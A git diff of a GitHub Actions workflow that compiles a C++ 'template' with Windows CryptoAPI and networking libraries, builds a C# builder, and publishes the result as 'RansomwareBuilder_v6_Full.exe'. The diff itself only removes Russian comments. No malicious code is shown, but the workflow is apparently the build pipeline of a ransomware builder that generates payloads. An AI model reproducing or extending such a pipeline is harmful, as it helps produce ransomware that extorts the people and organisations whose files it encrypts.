@@ -13,15 +13,13 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
     
-    # ========== СБОРКА ШАБЛОНА (БЕЗ OPENSSL!) ==========
+    # ========== СБОРКА ШАБЛОНА (БЕЗ OPENSSL) ==========
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
     
     - name: Build Template
       run: |
         Write-Host "=== Building template.cpp (NO OpenSSL) ==="
-        
-        # Собираем без OpenSSL, используем Windows CryptoAPI
         cl /O2 /MT /EHsc /std:c++17 /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib ws2_32.lib
         
         if (Test-Path template.exe) {
@@ -44,11 +42,9 @@ jobs:
       run: |
         msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
         
-        # Проверяем правильный путь где реально создается файл
         if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
             Write-Host "=== Build SUCCESS ==="
             Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
-            # Копируем в корень с правильным именем для загрузки
             Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v6_Full.exe"
         } else {
             Write-Host "=== Build FAILED ==="
